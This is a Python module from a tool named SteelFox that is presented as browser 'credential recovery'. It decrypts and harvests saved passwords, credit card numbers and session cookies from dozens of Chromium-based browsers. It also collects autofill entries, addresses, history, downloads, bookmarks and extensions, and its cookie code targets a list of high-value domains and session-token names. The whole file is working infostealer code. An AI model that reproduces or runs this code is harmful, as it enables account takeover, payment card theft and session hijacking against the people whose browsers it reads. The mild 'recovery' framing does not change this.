# -*- coding: utf-8 -*-
"""
SteelFox — Chromium-Based Browser Credential Recovery

Supports all modern Chromium v80+ browsers using AES-256-GCM encryption:
  - Google Chrome (stable, beta, canary, dev)
  - Microsoft Edge (stable, beta, canary, dev)
  - Brave Browser
  - Opera / Opera GX
  - Vivaldi
  - Arc
  - Chromium
  - CocCoc
  - Yandex Browser
  - And many more...

Also recovers:
  - Saved passwords
  - Credit card information
  - Cookies (session tokens)
  - Download history
  - Autofill data
  - Browsing history (recent)
"""

from __future__ import annotations

import logging
import os
import shutil
import sqlite3
import tempfile
from dataclasses import dataclass
from pathlib import Path
from typing import Any

from steelfox.core.config import config
from steelfox.core.module_base import Category, ModuleBase, ModuleMeta
from steelfox.core.winapi import (
    decrypt_chromium_password,
    get_chromium_master_key,
    safe_copy_db,
    query_db,
)

logger = logging.getLogger("steelfox")


# ─── Browser Profile Definitions ─────────────────────────────────────────

@dataclass
class ChromiumProfile:
    """Definition of a Chromium-based browser's profile location."""
    name: str
    paths: list[str]  # Relative to user's AppData


# All supported Chromium-based browsers with their profile paths
CHROMIUM_BROWSERS: list[ChromiumProfile] = [
    ChromiumProfile("Google Chrome", [
        "{LOCALAPPDATA}\\Google\\Chrome\\User Data",
    ]),
    ChromiumProfile("Google Chrome Beta", [
        "{LOCALAPPDATA}\\Google\\Chrome Beta\\User Data",
    ]),
    ChromiumProfile("Google Chrome Canary", [
        "{LOCALAPPDATA}\\Google\\Chrome SxS\\User Data",
    ]),
    ChromiumProfile("Google Chrome Dev", [
        "{LOCALAPPDATA}\\Google\\Chrome Dev\\User Data",
    ]),
    ChromiumProfile("Microsoft Edge", [
        "{LOCALAPPDATA}\\Microsoft\\Edge\\User Data",
    ]),
    ChromiumProfile("Microsoft Edge Beta", [
        "{LOCALAPPDATA}\\Microsoft\\Edge Beta\\User Data",
    ]),
    ChromiumProfile("Microsoft Edge Dev", [
        "{LOCALAPPDATA}\\Microsoft\\Edge Dev\\User Data",
    ]),
    ChromiumProfile("Microsoft Edge Canary", [
        "{LOCALAPPDATA}\\Microsoft\\Edge SxS\\User Data",
    ]),
    ChromiumProfile("Brave Browser", [
        "{LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\User Data",
    ]),
    ChromiumProfile("Opera", [
        "{APPDATA}\\Opera Software\\Opera Stable",
        "{APPDATA}\\Opera Software\\Opera Next",
    ]),
    ChromiumProfile("Opera GX", [
        "{APPDATA}\\Opera Software\\Opera GX Stable",
    ]),
    ChromiumProfile("Vivaldi", [
        "{LOCALAPPDATA}\\Vivaldi\\User Data",
    ]),
    ChromiumProfile("Arc", [
        "{LOCALAPPDATA}\\Packages\\TheBrowserCompany.Arc_ttt1ap7aakyb4\\LocalCache\\Local\\Arc\\User Data",
        "{LOCALAPPDATA}\\Arc\\User Data",
    ]),
    ChromiumProfile("Chromium", [
        "{LOCALAPPDATA}\\Chromium\\User Data",
    ]),
    ChromiumProfile("CocCoc", [
        "{LOCALAPPDATA}\\CocCoc\\Browser\\User Data",
    ]),
    ChromiumProfile("Yandex Browser", [
        "{LOCALAPPDATA}\\Yandex\\YandexBrowser\\User Data",
    ]),
    ChromiumProfile("Comodo Dragon", [
        "{LOCALAPPDATA}\\Comodo\\Dragon\\User Data",
    ]),
    ChromiumProfile("Torch", [
        "{LOCALAPPDATA}\\Torch\\User Data",
    ]),
    ChromiumProfile("7Star", [
        "{LOCALAPPDATA}\\7Star\\7Star\\User Data",
    ]),
    ChromiumProfile("Amigo", [
        "{LOCALAPPDATA}\\Amigo\\User Data",
    ]),
    ChromiumProfile("Centbrowser", [
        "{LOCALAPPDATA}\\CentBrowser\\User Data",
    ]),
    ChromiumProfile("Chedot", [
        "{LOCALAPPDATA}\\Chedot\\User Data",
    ]),
    ChromiumProfile("Sputnik", [
        "{LOCALAPPDATA}\\Sputnik\\Sputnik\\User Data",
    ]),
    ChromiumProfile("Orbitum", [
        "{LOCALAPPDATA}\\Orbitum\\User Data",
    ]),
    ChromiumProfile("Iridium", [
        "{LOCALAPPDATA}\\Iridium\\User Data",
    ]),
    ChromiumProfile("Epic Privacy Browser", [
        "{LOCALAPPDATA}\\Epic Privacy Browser\\User Data",
    ]),
    ChromiumProfile("Uran", [
        "{LOCALAPPDATA}\\uCozMedia\\Uran\\User Data",
    ]),
    ChromiumProfile("Slimjet", [
        "{LOCALAPPDATA}\\Slimjet\\User Data",
    ]),
    ChromiumProfile("QQBrowser", [
        "{LOCALAPPDATA}\\Tencent\\QQBrowser\\User Data",
    ]),
    ChromiumProfile("SogouExplorer", [
        "{LOCALAPPDATA}\\Sogou\\SogouExplorer\\User Data",
    ]),
    ChromiumProfile("Whale", [
        "{LOCALAPPDATA}\\Naver\\Naver Whale\\User Data",
    ]),
    ChromiumProfile("UCBrowser", [
        "{LOCALAPPDATA}\\UCBrowser\\User Data",
    ]),
]


class ChromiumBrowsers(ModuleBase):
    """Recovery module for all Chromium-based browsers."""

    meta = ModuleMeta(
        name="Chromium Browsers",
        category=Category.BROWSERS,
        description="Recover passwords, credit cards, cookies, and history from all Chromium-based browsers",
    )

    def run(self) -> list[dict[str, Any]]:
        all_results: list[dict[str, Any]] = []

        for browser in CHROMIUM_BROWSERS:
            for path_template in browser.paths:
                user_data_dir = self._resolve_path(path_template)
                if not user_data_dir or not Path(user_data_dir).exists():
                    continue

                # Get the master encryption key
                local_state = Path(user_data_dir) / "Local State"
                master_key = get_chromium_master_key(local_state)

                # Find all profile directories
                profiles = self._find_profiles(user_data_dir)

                for profile_path in profiles:
                    # Passwords
                    all_results.extend(
                        self._extract_passwords(browser.name, profile_path, master_key)
                    )
                    # Credit cards
                    all_results.extend(
                        self._extract_credit_cards(browser.name, profile_path, master_key)
                    )
                    # Cookies (high-value session tokens)
                    all_results.extend(
                        self._extract_cookies(browser.name, profile_path, master_key)
                    )
                    # Autofill
                    all_results.extend(
                        self._extract_autofill(browser.name, profile_path)
                    )
                    # History
                    all_results.extend(
                        self._extract_history(browser.name, profile_path)
                    )
                    # Downloads
                    all_results.extend(
                        self._extract_downloads(browser.name, profile_path)
                    )
                    # Bookmarks
                    all_results.extend(
                        self._extract_bookmarks(browser.name, profile_path)
                    )
                    # Extensions
                    all_results.extend(
                        self._extract_extensions(browser.name, profile_path)
                    )
                    # Saved addresses
                    all_results.extend(
                        self._extract_addresses(browser.name, profile_path)
                    )

        return all_results

    # ─── Internal Methods ────────────────────────────────────────────

    @staticmethod
    def _resolve_path(template: str) -> str | None:
        """Resolve a path template using config.profile."""
        try:
            result = template
            for key, value in config.profile.items():
                result = result.replace(f"{{{key}}}", value)
            return result
        except Exception:
            return None

    @staticmethod
    def _find_profiles(user_data_dir: str) -> list[Path]:
        """Find all Chrome-style profile directories (Default, Profile 1, etc.)."""
        base = Path(user_data_dir)
        profiles = []

        # Standard profile directories
        default = base / "Default"
        if default.exists():
            profiles.append(default)

        # Numbered profiles
        for item in base.iterdir():
            if item.is_dir() and item.name.startswith("Profile "):
                profiles.append(item)

        # Opera uses the base dir directly
        login_data = base / "Login Data"
        if login_data.exists() and base not in profiles:
            profiles.append(base)

        return profiles

    def _extract_passwords(
        self, browser_name: str, profile_path: Path, master_key: bytes | None
    ) -> list[dict[str, Any]]:
        """Extract saved passwords from Login Data database."""
        results: list[dict[str, Any]] = []
        db_file = profile_path / "Login Data"
        if not db_file.exists():
            return results

        tmp_db = safe_copy_db(db_file)
        if not tmp_db:
            return results

        try:
            rows = query_db(
                tmp_db,
                "SELECT origin_url, username_value, password_value FROM logins "
                "WHERE length(password_value) > 0",
            )
            for url, username, encrypted_pwd in rows:
                if not username and not encrypted_pwd:
                    continue

                password = ""
                if master_key and encrypted_pwd:
                    password = decrypt_chromium_password(encrypted_pwd, master_key)
                elif encrypted_pwd:
                    try:
                        from steelfox.core.winapi import win32_crypt_unprotect_data
                        password = win32_crypt_unprotect_data(encrypted_pwd).decode(
                            "utf-8", errors="replace"
                        )
                    except Exception:
                        pass

                if password:
                    results.append(self._make_credential(
                        source=browser_name,
                        url=url or "",
                        username=username or "",
                        password=password,
                    ))
        except Exception as e:
            logger.debug("Password extraction failed for %s: %s", browser_name, e)
        finally:
            try:
                os.remove(tmp_db)
            except Exception:
                pass

        return results

    def _extract_credit_cards(
        self, browser_name: str, profile_path: Path, master_key: bytes | None
    ) -> list[dict[str, Any]]:
        """Extract saved credit card information from Web Data database."""
        results: list[dict[str, Any]] = []
        db_file = profile_path / "Web Data"
        if not db_file.exists():
            return results

        tmp_db = safe_copy_db(db_file)
        if not tmp_db:
            return results

        try:
            rows = query_db(
                tmp_db,
                "SELECT name_on_card, card_number_encrypted, expiration_month, "
                "expiration_year FROM credit_cards",
            )
            for name, encrypted_number, exp_month, exp_year in rows:
                card_number = ""
                if master_key and encrypted_number:
                    card_number = decrypt_chromium_password(encrypted_number, master_key)
                elif encrypted_number:
                    try:
                        from steelfox.core.winapi import win32_crypt_unprotect_data
                        card_number = win32_crypt_unprotect_data(encrypted_number).decode(
                            "utf-8", errors="replace"
                        )
                    except Exception:
                        pass

                if card_number:
                    results.append({
                        "Source": f"{browser_name} (Credit Card)",
                        "Name on Card": name or "",
                        "Card Number": card_number,
                        "Expiration": f"{exp_month}/{exp_year}",
                    })
        except Exception as e:
            logger.debug("Credit card extraction failed for %s: %s", browser_name, e)
        finally:
            try:
                os.remove(tmp_db)
            except Exception:
                pass

        return results

    def _extract_cookies(
        self, browser_name: str, profile_path: Path, master_key: bytes | None
    ) -> list[dict[str, Any]]:
        """Extract high-value cookies and session tokens.

        Targets 40+ domains and prioritizes session-critical cookie names
        like SID, SSID, c_user, xs, user_session, etc.
        """
        results: list[dict[str, Any]] = []

        # Cookies might be in "Cookies" or "Network/Cookies"
        cookie_paths = [
            profile_path / "Cookies",
            profile_path / "Network" / "Cookies",
        ]

        for cookie_file in cookie_paths:
            if not cookie_file.exists():
                continue

            tmp_db = safe_copy_db(cookie_file)
            if not tmp_db:
                continue

            try:
                # Expanded high-value domain list (40+ targets)
                high_value_domains = [
                    # Major platforms
                    "%google%", "%youtube%", "%gmail%",
                    "%facebook%", "%instagram%", "%meta%",
                    "%github%", "%gitlab%", "%bitbucket%",
                    "%microsoft%", "%live.com%", "%outlook%", "%office%",
                    "%amazon%", "%aws.amazon%",
                    "%twitter%", "%x.com%",
                    "%linkedin%",
                    # Messaging & social
                    "%discord%", "%slack%", "%telegram%", "%teams.microsoft%",
                    "%reddit%", "%twitch%", "%tiktok%",
                    # Cloud & SaaS
                    "%dropbox%", "%onedrive%", "%icloud%",
                    "%salesforce%", "%atlassian%", "%jira%",
                    "%zoom%", "%notion%",
                    # Dev & CI/CD
                    "%openai%", "%chat.openai%", "%claude%", "%anthropic%",
                    "%vercel%", "%netlify%", "%heroku%", "%docker%",
                    "%npmjs%", "%pypi%",
                    # Finance & commerce
                    "%paypal%", "%stripe%", "%shopify%",
                    # Entertainment
                    "%netflix%", "%spotify%", "%apple%",
                    # Security & auth
                    "%okta%", "%auth0%",
                ]

                # Session-critical cookie names to always capture
                session_cookie_names = [
                    "SID", "SSID", "HSID", "APISID", "SAPISID",  # Google
                    "c_user", "xs", "fr", "datr",  # Facebook
                    "user_session", "_gh_sess", "logged_in",  # GitHub
                    "token", "session", "auth", "sid", "csrf",  # Generic
                    "d", "d-s",  # Slack
                    "__Secure-1PSID", "__Secure-3PSID",  # Google secure
                ]

                seen: set[tuple[str, str]] = set()

                # 1. Domain-based extraction
                for domain_pattern in high_value_domains:
                    rows = query_db(
                        tmp_db,
                        f"SELECT host_key, name, encrypted_value, path, "
                        f"expires_utc "
                        f"FROM cookies WHERE host_key LIKE '{domain_pattern}' "
                        f"AND length(encrypted_value) > 0 LIMIT 30",
                    )
                    for host, name, encrypted_val, path, expires_utc in rows:
                        key = (host, name)
                        if key in seen:
                            continue
                        seen.add(key)

                        value = ""
                        if master_key and encrypted_val:
                            value = decrypt_chromium_password(encrypted_val, master_key)

                        if value:
                            # Calculate expiry as human-readable
                            expiry = ""
                            if expires_utc and expires_utc > 0:
                                try:
                                    # Chrome epoch: Jan 1, 1601
                                    epoch_diff = 11644473600
                                    unix_ts = (expires_utc / 1_000_000) - epoch_diff
                                    from datetime import datetime, timezone
                                    expiry = datetime.fromtimestamp(
                                        unix_ts, tz=timezone.utc
                                    ).strftime("%Y-%m-%d %H:%M:%S UTC")
                                except Exception:
                                    pass

                            results.append({
                                "Source": f"{browser_name} (Cookie)",
                                "Host": host,
                                "Cookie Name": name,
                                "Value": value[:500] + "..." if len(value) > 500 else value,
                                "Path": path,
                                "Expires": expiry or "Session",
                            })

                # 2. Session-critical cookie name extraction (any domain)
                name_conditions = " OR ".join(
                    f"name = '{n}'" for n in session_cookie_names
                )
                rows = query_db(
                    tmp_db,
                    f"SELECT host_key, name, encrypted_value, path, "
                    f"expires_utc FROM cookies "
                    f"WHERE ({name_conditions}) "
                    f"AND length(encrypted_value) > 0 LIMIT 100",
                )
                for host, name, encrypted_val, path, expires_utc in rows:
                    key = (host, name)
                    if key in seen:
                        continue
                    seen.add(key)

                    value = ""
                    if master_key and encrypted_val:
                        value = decrypt_chromium_password(encrypted_val, master_key)

                    if value:
                        expiry = ""
                        if expires_utc and expires_utc > 0:
                            try:
                                epoch_diff = 11644473600
                                unix_ts = (expires_utc / 1_000_000) - epoch_diff
                                from datetime import datetime, timezone
                                expiry = datetime.fromtimestamp(
                                    unix_ts, tz=timezone.utc
                                ).strftime("%Y-%m-%d %H:%M:%S UTC")
                            except Exception:
                                pass

                        results.append({
                            "Source": f"{browser_name} (Session Cookie)",
                            "Host": host,
                            "Cookie Name": name,
                            "Value": value[:500] + "..." if len(value) > 500 else value,
                            "Path": path,
                            "Expires": expiry or "Session",
                        })

            except Exception as e:
                logger.debug("Cookie extraction failed for %s: %s", browser_name, e)
            finally:
                try:
                    os.remove(tmp_db)
                except Exception:
                    pass

        return results

    def _extract_autofill(
        self, browser_name: str, profile_path: Path
    ) -> list[dict[str, Any]]:
        """Extract autofill form data."""
        results: list[dict[str, Any]] = []
        db_file = profile_path / "Web Data"
        if not db_file.exists():
            return results

        tmp_db = safe_copy_db(db_file)
        if not tmp_db:
            return results

        try:
            rows = query_db(
                tmp_db,
                "SELECT name, value, count FROM autofill "
                "WHERE length(value) > 0 ORDER BY count DESC LIMIT 100",
            )
            for name, value, count in rows:
                if value and name:
                    results.append({
                        "Source": f"{browser_name} (Autofill)",
                        "Field": name,
                        "Value": value,
                        "Usage Count": str(count),
                    })
        except Exception as e:
            logger.debug("Autofill extraction failed for %s: %s", browser_name, e)
        finally:
            try:
                os.remove(tmp_db)
            except Exception:
                pass

        return results

    def _extract_downloads(
        self, browser_name: str, profile_path: Path
    ) -> list[dict[str, Any]]:
        """Extract download history."""
        results: list[dict[str, Any]] = []
        db_file = profile_path / "History"
        if not db_file.exists():
            return results

        tmp_db = safe_copy_db(db_file)
        if not tmp_db:
            return results

        try:
            rows = query_db(
                tmp_db,
                "SELECT tab_url, target_path, total_bytes, "
                "datetime(start_time / 1000000 - 11644473600, 'unixepoch') as started "
                "FROM downloads ORDER BY start_time DESC LIMIT 100",
            )
            for url, target_path, size, started in rows:
                results.append({
                    "Source": f"{browser_name} (Download)",
                    "URL": url or "",
                    "File Path": target_path or "",
                    "Size (bytes)": str(size) if size else "",
                    "Date": started or "",
                })
        except Exception as e:
            logger.debug("Download extraction failed for %s: %s", browser_name, e)
        finally:
            try:
                os.remove(tmp_db)
            except Exception:
                pass

        return results

    def _extract_bookmarks(
        self, browser_name: str, profile_path: Path
    ) -> list[dict[str, Any]]:
        """Extract bookmarks from the Bookmarks JSON file."""
        results: list[dict[str, Any]] = []
        bookmarks_file = profile_path / "Bookmarks"
        if not bookmarks_file.exists():
            return results

        try:
            import json
            data = json.loads(bookmarks_file.read_text(encoding="utf-8", errors="replace"))
            roots = data.get("roots", {})
            for root_name, root_node in roots.items():
                if isinstance(root_node, dict):
                    self._walk_bookmarks(browser_name, root_node, root_name, results)
        except Exception as e:
            logger.debug("Bookmarks extraction failed for %s: %s", browser_name, e)

        return results

    def _walk_bookmarks(
        self, browser_name: str, node: dict, folder: str, results: list[dict[str, Any]]
    ) -> None:
        """Recursively walk bookmark tree."""
        if node.get("type") == "url":
            results.append({
                "Source": f"{browser_name} (Bookmark)",
                "Name": node.get("name", ""),
                "URL": node.get("url", ""),
                "Folder": folder,
            })
        for child in node.get("children", []):
            child_folder = f"{folder}/{child.get('name', '')}"
            self._walk_bookmarks(browser_name, child, child_folder, results)

    def _extract_extensions(
        self, browser_name: str, profile_path: Path
    ) -> list[dict[str, Any]]:
        """List installed browser extensions."""
        results: list[dict[str, Any]] = []
        extensions_dir = profile_path / "Extensions"
        if not extensions_dir.exists():
            return results

        try:
            prefs_file = profile_path / "Preferences"
            ext_names: dict[str, str] = {}

            if prefs_file.exists():
                import json
                try:
                    prefs = json.loads(prefs_file.read_text(encoding="utf-8", errors="replace"))
                    extensions = prefs.get("extensions", {}).get("settings", {})
                    for ext_id, ext_info in extensions.items():
                        name = ext_info.get("manifest", {}).get("name", "")
                        if name:
                            ext_names[ext_id] = name
                except Exception:
                    pass

            for ext_dir in extensions_dir.iterdir():
                if ext_dir.is_dir():
                    ext_id = ext_dir.name
                    name = ext_names.get(ext_id, ext_id)

                    # Get version from latest subdirectory
                    versions = sorted(ext_dir.iterdir(), key=lambda p: p.name) if ext_dir.exists() else []
                    version = versions[-1].name if versions else "unknown"

                    results.append({
                        "Source": f"{browser_name} (Extension)",
                        "Extension ID": ext_id,
                        "Name": name,
                        "Version": version,
                    })
        except Exception as e:
            logger.debug("Extension extraction failed for %s: %s", browser_name, e)

        return results

    def _extract_addresses(
        self, browser_name: str, profile_path: Path
    ) -> list[dict[str, Any]]:
        """Extract saved addresses / autofill profiles."""
        results: list[dict[str, Any]] = []
        db_file = profile_path / "Web Data"
        if not db_file.exists():
            return results

        tmp_db = safe_copy_db(db_file)
        if not tmp_db:
            return results

        try:
            rows = query_db(
                tmp_db,
                "SELECT company_name, street_address, city, state, zipcode, "
                "country_code, use_count, "
                "datetime(date_modified, 'unixepoch') as modified "
                "FROM autofill_profiles LIMIT 50",
            )
            for company, street, city, state, zipcode, country, uses, modified in rows:
                address_parts = [p for p in [street, city, state, zipcode, country] if p]
                if address_parts:
                    results.append({
                        "Source": f"{browser_name} (Address)",
                        "Company": company or "",
                        "Address": ", ".join(address_parts),
                        "Usage Count": str(uses),
                        "Last Modified": modified or "",
                    })
        except Exception as e:
            logger.debug("Address extraction failed for %s: %s", browser_name, e)
        finally:
            try:
                os.remove(tmp_db)
            except Exception:
                pass

        return results

    def _extract_history(
        self, browser_name: str, profile_path: Path
    ) -> list[dict[str, Any]]:
        """Extract recent browsing history (last 50 entries)."""
        results: list[dict[str, Any]] = []
        db_file = profile_path / "History"
        if not db_file.exists():
            return results

        tmp_db = safe_copy_db(db_file)
        if not tmp_db:
            return results

        try:
            rows = query_db(
                tmp_db,
                "SELECT url, title, visit_count, "
                "datetime(last_visit_time / 1000000 - 11644473600, 'unixepoch') as last_visit "
                "FROM urls ORDER BY last_visit_time DESC LIMIT 50",
            )
            for url, title, visit_count, last_visit in rows:
                results.append({
                    "Source": f"{browser_name} (History)",
                    "URL": url,
                    "Title": title or "",
                    "Visits": str(visit_count),
                    "Last Visit": last_visit or "",
                })
        except Exception as e:
            logger.debug("History extraction failed for %s: %s", browser_name, e)
        finally:
            try:
                os.remove(tmp_db)
            except Exception:
                pass

        return results
